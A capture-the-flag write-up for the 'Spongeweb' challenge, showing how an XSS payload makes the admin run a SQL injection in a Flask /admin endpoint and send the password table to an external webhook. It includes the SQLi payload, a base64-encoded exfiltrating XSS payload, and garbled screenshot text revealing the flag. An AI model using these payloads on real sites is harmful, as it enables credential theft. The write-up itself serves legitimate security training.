# Spongeweb
> I really like hacking.
> I really like privacy.
> And I really like spongebob.
> I combined all of them and created an anonymous sharing platform with HTML support. Feel free to share payloads, malware, and stolen credit cards ;).
> Btw it's called spongeweb, but it has nothing to do with [this](https://trollpasta.com/wiki/SpongeWeb).

## About the Challenge
We were given a source code that you can download the source code [here](spongeweb.zip)

## How to Solve?
This is a combination between Cross-Site Scripting (XSS) and SQL Injection (SQLi). The flag was located in the admin password (You can check in the `users` table). Instead of stealing the cookie, we can exploit the website using SQL Injection because of there is no filter in `/admin` endpoint

```python
@app.route('/admin', methods=['GET', 'POST'])
def admin():
	if 'username' not in session:
		return redirect(url_for('login'))
	#view analytics
	if 'query' in request.args:
		query = request.args.get('query')
		try:
			cur = get_db().execute("SELECT count(*) FROM {0}".format(query))
		except:
			return render_template('adminPanel.html') , 500
		result = cur.fetchall()
		cur.close()
		return render_template('adminPanel.html', result=result, param=query)	
	else:
		return render_template('adminPanel.html')
```

And we need to print the flag by using `users union select (select password from users)--` payload. Example:

```
GET /admin?query=users union select (select password from users)--
Host: xxxxx
User-Agent: xxxx
...
```

And because we can't access `/admin` endpoint directly, we need to exploit the website using XSS to trick the admin to execute SQL injection and then send the result into our webhook. Here is the final payload I used to obtain the flag

```
<img src=x onerror=eval(atob("ZmV0Y2goJy9hZG1pbj9xdWVyeT11c2VycyUyMHVuaW9uJTIwc2VsZWN0JTIwJTI4c2VsZWN0JTIwcGFzc3dvcmQlMjBmcm9tJTIwdXNlcnMlMjktLScpLnRoZW4oKHIpPT5yLnRleHQoKSkudGhlbigocik9PndpbmRvdy5sb2NhdGlvbi5ocmVmPSdodHRwczovL3dlYmhvb2suc2l0ZS9iN2M3YjMwYy0xNTM2LTQ2NzItYTE1Yy02NDZiY2QxZWYyOGUvJyt3aW5kb3cuYnRvYShyKSk="))>
```

Create the thread and then report the URL to admin. My webhook:


[Image extracted text: Request Details
Permalink
Raw content
Copy as
REQUESTS (1/500)
Newest First
Search Query
GET
https:IIwebhook sitelb7c7b3Oc-1536-4672-a15c-646bcd1ef28e/PCFkb2
NOeXBIIGhObWw+CjxodG1sPgoKPGhIYWQ+Cgk8dGIObGU+QWRtaW4g
UGFuZWw8L3RpdGxIPgoJPGxpbmsgcmVsPSJzdHIsZXNoZWVOliBocmV
GET
#9679e 95.217.239.37
mPSIvc3RhdGIjLZFkbWluL XNOeWxlLmNzcyl+Cgk8bGluayByZWwglmljbz
29/10/2023 16.57.35
4iIGhyzwY9lmRhdGE6O2Jhc2UZNCxpVkJPUncwSOdnbzOiPgo8L ZhIYW
Q+Cgo8YmgkeT4KCQo8aDE+QWRtaW4gUGFuZWw8L2gxPgo8ZmgybS
BtZXRobzQglmdldClgYWNOaWguPSIvYWRtaW4iPgoJPGxhYmVsPkFuY
WxbdGljczwvbGFiZWw+CgkBaWSwdXQgdHlwZTOidGV4dClgbmFtZTOicX
VlcnkiPixicj4KCTxpbnB1dCBOeXBIPSJzdWJtaXQilHZhbHVIPSJTZWFyY2
giPgo8LZZvcmO+CiAgICAKPGgxPIJIc3VsdDwvaDE+CgoJPGgyPnVzZXJz
IHVuaWgulHNIbGVjdCAc2VsZWNOIHBhc3N3b3JkIGZybzOgdXNIcnMpL
SOgOiAxPC9oMj4KCQoJPGgyPnVzZXJzIHVuaW9ulHNIbGVjdCAoc2Vsz
WNOIHBhc3N3b3JkIGZybzOgdXNlcnMpLSOgOiBzcmRubGVueIhTUINfY
3IwUBNfUzFUM19zUDBuRzN3RWJfU1FMaXo8L2gyPgoJCgo8ZmgybSBt
ZXRobzQglmdldClgYWNOaWguPSIvbG9nb3VOlj4KCTxpbnBIdCBOeXBIP
SJzdWJtaXQilHZhbHVIPSJMbZdvdXQiPgo8L ZZvcmO+CgoKCQoJCgkKP
C9ibZRSPgoKPCgodGIsPg-=
Host
95.217.239.37
Whois
Shodan
Netify   Censys
Date
29/10/2023 16.57.35 (6 hours ago)
Size
0
bytes
ID
9679e7d2-8082-404f-ae12-52120a857914]


Decode the `Base64` encoded string to obtain the flag


[Image extracted text: PCFkbZNOeXBLIGhobW+CjxodGlsPgoKPGhLYWQ+Cgk8dGlObGU+QWRtaW4gUGFuZWw8L3RpdGx LP
From Base64
goJPGxpbmsgcmVsPSJzdHLsZXNoZWVOIiBocmVmPSIvc3RhdGljLZFkbWLuLXNOeWx LLMNZcyI+Cg
k8bGluayByZWw9Imljb24iIGhyZWY9ImRhdGE6O2Jhc2UZNCxpVkJPUncwsodnbzoiPgo8LZhLYWQ
Alphabet
A-Za-z0-9+/=
+Cgo8YmgkeT4KCQo8aDE+QWRtaWAgUGFuZWw8LZgxPgo8ZmgybSBtZXRob2QgImdldCIgYWNOaWgu
PSIvYWRtaW4iPgoJPGxhYmVsPkFuYWxSdGljczwvbGFiZW-Cgk8aWSwdXQgdH wZTOidGVAdCIgb
mFtZTOicXVlcnkiPjxicj4KCTxpbnBldCBOeXB PSJzdWJtaXQiIHZhbHVIPSJTZWFyY2giPgo8LZ
Remove non-alphabet chars
Strict mode
Zvcmu+CiAgICAKPGgxP JIc3VsdDwvaDE+CgoJPGgyPnVzZXJzIHVuaWguIHNbGVjdCAocZVsZWN
OIHBhc3N3b3JkIGZybzogdXNIcnMpLSOgOiAxPC9oMj 4KCQoJPGgyPnVzZXJzIHVuaWguIHNLbGVj
dCAocZVsZWNOIHBhc3N3b3JkIGZybzogdXN cnMpLSOgOiBzcmRubGVuelhTUINfY3IwUBNfUzFUM
19ZUDBuRZNBRWJfUIFMaXo8LZgyPgoJCgo8ZmgybSBtZXRob2QgImdldCIgYWNOaWguPSIvbGgnb3
VOIj4KCTxpbnBldCBOeXB PSJzdWJtaXQiIHZhbHV PSJMbZdvdXQiPgo8LZZvcmo+CgoKCQoJCgk
KPC9ibZRSPgoKPC9odGlsPg==
AbC
872
5
TT
Raw Bytes
LF
Output
0 0 @
{3
<hl-Result</hl>
<hzzusers
union
select
(select
password
from
users) _
1</h2>
<hzzusers
union
select
(select password from
users) _
srdnlen{XSSS_cross_S1T3_sPOnG3wEb_SQLi}</h2>
<form method-"get"
action-" /logout">
<input type-"submit"
value-"Logout">
<lformz]


```
srdnlen{XSSS_cr0Ss_S1T3_sP0nG3wEb_SQLi}
```